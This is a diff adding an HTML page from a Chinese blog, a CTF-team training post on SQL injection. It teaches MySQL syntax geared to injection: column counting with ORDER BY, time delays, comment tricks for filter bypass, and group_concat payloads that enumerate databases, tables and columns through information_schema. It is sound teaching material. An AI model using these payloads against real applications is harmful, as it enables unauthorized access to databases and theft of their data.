@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sissel">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sissel">
+    
+    <meta name="keywords" content="天枢,Dubhe,CTFer,程序员">
+    
+    <meta name="description" content="长颈鹿的脖子为什么那么长？">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>【学习】天枢队内培训-SQL注入部分 · Sissel&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sissel&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【学习】天枢队内培训-SQL注入部分</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sissel's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            【学习】天枢队内培训-SQL注入部分
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL">SQL</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.4k</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/12/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>为了让队里的师傅掌握基本的SQL语法，学习盲注的方法。<br>在学习web安全之前，建议先去学web开发 XD</p>
+<a id="more"></a>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><ol>
+<li>有回显<br> a. 联合查询注入 union<br> b. 报错注入 error</li>
+<li>无回显<br> a. 基于时间注入 time<br> b. 基于布尔注入 boolean</li>
+<li>堆叠注入 stuck</li>
+</ol>
+<h2 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a>SQL语法</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>最常用的，从某个表中，查询数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,column_name</span><br><span class="line">FROM table_name;</span><br><span class="line"></span><br><span class="line">SELECT * FROM &#96;websites&#96; WHERE id&#x3D;1; &#x2F;&#x2F; 分号是语句分隔符，非必须</span><br><span class="line">select * from test.websites where country&#x3D;&#39;CN&#39;;</span><br><span class="line">select name from websites where alexa &lt; 20; &#x2F;&#x2F; alexa排名小于20的，站点名称。</span><br></pre></td></tr></table></figure></p>
+<h3 id="更朴实的查询"><a href="#更朴实的查询" class="headerlink" title="更朴实的查询"></a>更朴实的查询</h3><p>类似于其他语言的print，select就是sql语句中的print，但你确认不了某个函数或者语法的输出时，不妨直接select。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 8*8;</span><br><span class="line">select version(); &#x2F;&#x2F; 获取当前数据库版本</span><br><span class="line">select left(version(),5); &#x2F;&#x2F; 获取数据库版本的前五个字节</span><br></pre></td></tr></table></figure></p>
+<h3 id="在命令行中查看数据库和数据"><a href="#在命令行中查看数据库和数据" class="headerlink" title="在命令行中查看数据库和数据"></a>在命令行中查看数据库和数据</h3><p>这些命令，也是开发者在拿到一个数据库服务后会做的事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show databases; &#x2F;&#x2F; 查看所有数据库</span><br><span class="line">use test; &#x2F;&#x2F; 进入test这个数据库</span><br><span class="line">show tables; &#x2F;&#x2F; 查看这个库里面的所有表</span><br><span class="line">desc websites; &#x2F;&#x2F; 查看表的结构</span><br><span class="line">show create table websites; &#x2F;&#x2F;查看建这个表用到的语句，其实也是看表的结构</span><br><span class="line">select * from websites limit 3; &#x2F;&#x2F; 查看前三条数据</span><br></pre></td></tr></table></figure></p>
+<h3 id="逻辑条件、比较（算数运算符-gt-lt-，逻辑运算符-与-或-非）"><a href="#逻辑条件、比较（算数运算符-gt-lt-，逻辑运算符-与-或-非）" class="headerlink" title="逻辑条件、比较（算数运算符 &gt; &lt; =，逻辑运算符 与 或 非）"></a>逻辑条件、比较（算数运算符 &gt; &lt; =，逻辑运算符 与 或 非）</h3><p>从 “Websites” 表中选取国家为 “CN” 且alexa排名大于 “50” 的所有网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Websites WHERE country&#x3D;&#39;CN&#39; AND alexa &gt; 50;</span><br><span class="line"></span><br><span class="line">select 1&gt;0 and 2&lt;&#x3D;0; &#x2F;&#x2F; select 1&gt;0 &amp;&amp; 2&lt;&#x3D;0;</span><br><span class="line">select 1&gt;0 or 2&lt;&#x3D;0; &#x2F;&#x2F; select 1&gt;0 || 2&lt;&#x3D;0;</span><br><span class="line">select name from websites where (id&gt;2 and alexa &gt; 50) &#x2F;&#x2F;可以用括号选择优先级。</span><br><span class="line"></span><br><span class="line">select * from websites where id !&#x3D; 1; </span><br><span class="line">select * from websites where id &lt;&gt; 1;</span><br><span class="line">select * from websites where not(id &#x3D; 1); &#x2F;&#x2F; 逻辑 非</span><br><span class="line">select * from websites where trUe;</span><br><span class="line">select * from websites where falSe;</span><br></pre></td></tr></table></figure></p>
+<p>where子句，你可以理解成：MySQL针对 表 中的每行数据，都会去进行一次判断，如果为true 就把他输出出来。</p>
+<h3 id="limit、order-by"><a href="#limit、order-by" class="headerlink" title="limit、order by"></a>limit、order by</h3><p>limit可以用来限制查询结果输出的行数，order by用来对查询结果排序。请注意，有特殊的order写法，可以判断前面的列数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,column_name</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column_name,column_name ASC|DESC;</span><br><span class="line"></span><br><span class="line">SELECT * FROM Websites ORDER BY alexa; &#x2F;&#x2F; 按 alexa 列升序排列。</span><br><span class="line">SELECT * FROM Websites ORDER BY country, alexa; &#x2F;&#x2F; 按 country 列升序排列，相同则按alexa列排列数据。 还可以通过asc、desc改变升降序</span><br><span class="line"></span><br><span class="line"># 特别注意！</span><br><span class="line">SELECT id, name FROM Websites ORDER BY 1; &#x2F;&#x2F; 按 第一列 排序</span><br><span class="line">SELECT id, name FROM Websites ORDER BY 2; &#x2F;&#x2F; 按 第二列 排序</span><br><span class="line">SELECT id, name FROM Websites ORDER BY 100; &#x2F;&#x2F; 按 第一百列 排序，报错！</span><br><span class="line">可以通过这个方法，推测前面查询了几列</span><br><span class="line"></span><br><span class="line">select * from Websites where id &gt;&#x3D;1 limit 2; &#x2F;&#x2F;控制输出结果为（第零条开始），一共两条。</span><br><span class="line">select * from Websites where id &gt;&#x3D;1 limit 1,2; &#x2F;&#x2F;控制输出结果为第一条开始，一共两条。要注意写代码中，数组都是从0开始的。</span><br></pre></td></tr></table></figure></p>
+<h3 id="对查询结果处理"><a href="#对查询结果处理" class="headerlink" title="对查询结果处理"></a>对查询结果处理</h3><p>除了在where子句中，我们也可以对查询的字段做处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id, name, alexa from  websites;</span><br><span class="line">select id, name, 2*alexa from websites; </span><br><span class="line">select id, name, 2*alexa, &#39;aaaaa&#39; from websites; </span><br></pre></td></tr></table></figure></p>
+<h3 id="sql语言中的函数"><a href="#sql语言中的函数" class="headerlink" title="sql语言中的函数"></a>sql语言中的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br><span class="line">select @@version; &#x2F;&#x2F;另一种非函数调用的写法查询版本。</span><br><span class="line">select user(); &#x2F;&#x2F; database()</span><br></pre></td></tr></table></figure>
+<h3 id="从字符和ascii开始"><a href="#从字符和ascii开始" class="headerlink" title="从字符和ascii开始"></a>从字符和ascii开始</h3><p>任何语言，都逃不掉学习ascii码和字符互相转换的方法。XD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);</span><br><span class="line">select ord(&#39;a&#39;);</span><br><span class="line">select char(97);</span><br><span class="line">select ascii(&#39;a&#39;)&#x3D;0x61; &#x2F;&#x2F; 97</span><br><span class="line">select hex(1234);   &#x2F;&#x2F; 转成十六进制</span><br><span class="line">select hex(&#39;abcd&#39;); &#x2F;&#x2F; hex编码</span><br><span class="line">select unhex(61626364);</span><br><span class="line">SELECT unhex(&#39;61626364&#39;)</span><br><span class="line"></span><br><span class="line">试试下面的语句，会发现一些问题。SQL语句是不区分大小写的。</span><br><span class="line">select &#39;a&#39; &#x3D; &#39;A&#39;;</span><br><span class="line"></span><br><span class="line">select binary(&#39;a&#39;) &#x3D; binary(&#39;A&#39;)；</span><br><span class="line">SELECT * FROM TABLE NAME WHERE name&#x3D;&#39;mimvp.com&#39;;</span><br><span class="line">SELECT * FROM TABLE NAME WHERE name&#x3D;&#39;MiMVP.com&#39;; &#x2F;&#x2F; 结果相同</span><br><span class="line">SELECT * FROM TABLE NAME WHERE BINARY name&#x3D;&#39;MiMVP.com&#39;; &#x2F;&#x2F; 解决方法，加入binary关键字</span><br></pre></td></tr></table></figure><br>binary是MySQL一种数据类型。</p>
+<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><p>一共有五种方式可以截取字符串，同时还有一个变形<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#39;abcd&#39;,2,1); &#x2F;&#x2F; 从第二个字符开始，截一个</span><br><span class="line">select substring(&#39;abcd&#39;,2,1);</span><br><span class="line">select mid(&#39;abcd&#39;,2,1);</span><br><span class="line">select left(&#39;abcd&#39;,2); &#x2F;&#x2F; 截字符串前两个字节</span><br><span class="line">select right(&#39;abcd&#39;,2); &#x2F;&#x2F; 截字符串后两个字节</span><br><span class="line"></span><br><span class="line">select left(&#39;abcd&#39;,2)&#x3D;&#39;ab&#39;;</span><br><span class="line"></span><br><span class="line">select substr(&#39;abcd&#39; from 1 for 2); &#x2F;&#x2F;这就是变形，注意没有用到逗号</span><br><span class="line">select substring(&#39;abcd&#39; from 1 for 2); &#x2F;&#x2F;mid也行</span><br></pre></td></tr></table></figure></p>
+<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><p>首先是最基本的运算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 8+8; &#x2F;&#x2F; - * &#x2F; % ^ 模和异或 &amp; | </span><br></pre></td></tr></table></figure></p>
+<h3 id="算术运算符-比较"><a href="#算术运算符-比较" class="headerlink" title="算术运算符-比较"></a>算术运算符-比较</h3><p>有无数种方式来判断两个 值 是否相等。看看你能想到比我更多的吗hh<br>// 数字和数字，输出的结果为1/true，即为真。0/false，为假。或者适用于多个元素的一些写法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select 1&#x3D;0;</span><br><span class="line">select 1!&#x3D;0; &#x2F;&#x2F;  &lt;&gt;</span><br><span class="line">select 1&lt;&#x3D;0;</span><br><span class="line">select 1^1; &#x2F;&#x2F; 异或，自己异或自己为0，1^2 不为0</span><br><span class="line">select 1^1&#x3D;0; &#x2F;&#x2F; 异或，自己异或自己为0，1^2 不为0</span><br><span class="line">select 1-1; &#x2F;&#x2F; 相减，为0即为false</span><br><span class="line">select 5 between 2 and 10;</span><br><span class="line">select * from websites where id between 2 and 4; &#x2F;&#x2F; between</span><br><span class="line">select * from websites where id in (1,4,5);</span><br></pre></td></tr></table></figure></p>
+<p>// 字符或字符串，非常多的比较方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select &#39;a&#39; &#x3D; &#39;a&#39;;</span><br><span class="line">select ascii(&#39;a&#39;) &#x3D; 97; &#x2F;&#x2F; 转换为数字进行比较</span><br><span class="line">select &#39;abcdefgh&#39; like &#39;abc%&#39;; &#x2F;&#x2F; abcedfgh的开头为abc，%替换任意数量的任意字符</span><br><span class="line">select &#39;abcdefgh&#39; like &#39;%abc%&#39;; &#x2F;&#x2F; 字符串里是否含abc</span><br><span class="line">select &#39;abcd&#39; like &#39;abc_&#39;; &#x2F;&#x2F; 字符串是否是 abcx</span><br><span class="line">select &#39;abcd&#39; like &#39;_abc_&#39;; &#x2F;&#x2F; 字符串是否是 xabcx</span><br><span class="line">select * from websites where url LIKE &#39;https%&#39;;</span><br></pre></td></tr></table></figure></p>
+<p>学习一下like子句，类似模糊搜索。通配符 % ，仅代替一个字符的 _ 。<br>同时在数据库中，你可以用 十六进制代替数字和字符串（info -&gt; 0x696e666f）</p>
+<h3 id="算术运算符-比较2"><a href="#算术运算符-比较2" class="headerlink" title="算术运算符-比较2"></a>算术运算符-比较2</h3><p>还有正则表达式。<br>regexp：正则表达式匹配<br>SELECT * FROM Websites WHERE name REGEXP ‘^[GFs]’;</p>
+<p>以上两部分都可以参考菜鸟教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-wildcards.html">https://www.runoob.com/sql/sql-wildcards.html</a></p>
+<h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><p>SQL语法要学的不剩太多了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select len(&#39;abcdefg&#39;);</span><br><span class="line">select group_concat(name) from websites; &#x2F;&#x2F; 多行变一行</span><br><span class="line">select concat(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);</span><br></pre></td></tr></table></figure></p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>可以将两个select的查询结果，拼接在一起。注意用union select ，两次查询结果列数不相同会报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, name, alexa FROM &#96;websites&#96; where id &lt;3 union select 1,2,3; </span><br><span class="line"></span><br><span class="line">SELECT id, name, alexa FROM &#96;websites&#96; where id &lt;3 union select 1,2;</span><br></pre></td></tr></table></figure></p>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>SQL中注释的方式很多，他们常用来绕过不能使用空格的情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select 123; #hi</span><br><span class="line">select 123; -- 1234 注意，--后面必须有一个空白字符！</span><br><span class="line">select&#x2F;*hi*&#x2F;123; &#x2F;&#x2F;hi</span><br><span class="line"></span><br><span class="line">&#x2F;*!select*&#x2F;1234;    &#x2F;&#x2F; 神奇的写法！其实是用来根据不同版本决定执行什么命令</span><br><span class="line">select sleep&#x2F;**&#x2F;(5);</span><br></pre></td></tr></table></figure></p>
+<h3 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h3><p>等待也有两种形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5);</span><br><span class="line">select BENCHMARK(1000000,ENCODE(&#39;hello&#39;,&#39;goodbye&#39;));</span><br></pre></td></tr></table></figure></p>
+<h3 id="特殊的库"><a href="#特殊的库" class="headerlink" title="特殊的库"></a>特殊的库</h3><p>information_schema，里面的三个重要的table。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#96;SCHEMA_NAME&#96; FROM &#96;SCHEMATA&#96;;</span><br><span class="line">SELECT &#96;TABLE_NAME&#96; FROM &#96;TABLES&#96; where table_schema&#x3D;&quot;test&quot;;</span><br><span class="line">SELECT COLUMN_NAME  FROM &#96;COLUMNS&#96; WHERE &#96;TABLE_NAME&#96; &#x3D; &#39;websites&#39;;</span><br></pre></td></tr></table></figure></p>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select if(1,1,0);</span><br><span class="line">select case when then;</span><br></pre></td></tr></table></figure>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>过滤输入</p>
+<ul>
+<li>输入中存在关键字union，立刻终止执行</li>
+<li>输入中存在关键字union，会将其置空（双写绕过） uniunionOn select 1,2,3;</li>
+<li>输入中存在关键字union，会将其替换成别的 xxxx</li>
+</ul>
+<h3 id="更好的payload（使用group-concat）"><a href="#更好的payload（使用group-concat）" class="headerlink" title="更好的payload（使用group_concat）"></a>更好的payload（使用group_concat）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查库名</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">查表名</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br><span class="line">查列名</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
